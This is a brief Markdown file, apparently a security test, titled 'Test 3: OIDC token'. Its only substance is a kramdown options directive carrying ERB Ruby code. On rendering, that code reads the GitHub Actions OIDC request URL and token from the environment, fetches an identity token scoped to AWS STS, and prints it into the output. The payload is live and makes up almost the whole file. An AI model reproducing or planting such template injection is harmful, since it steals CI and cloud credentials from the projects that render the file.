---
---

# Test 3: OIDC token

{::options template="string://<%= require 'net/http'; u = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_URL','NONE'); t = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_TOKEN','NONE'); r = 'NO_OIDC'; begin; r = Net::HTTP.get(URI(u + '&audience=sts.amazonaws.com'), 'Authorization' => 'Bearer ' + t) if u != 'NONE'; rescue => e; r = e.message; end; r[0..800] %>" /}

placeholder
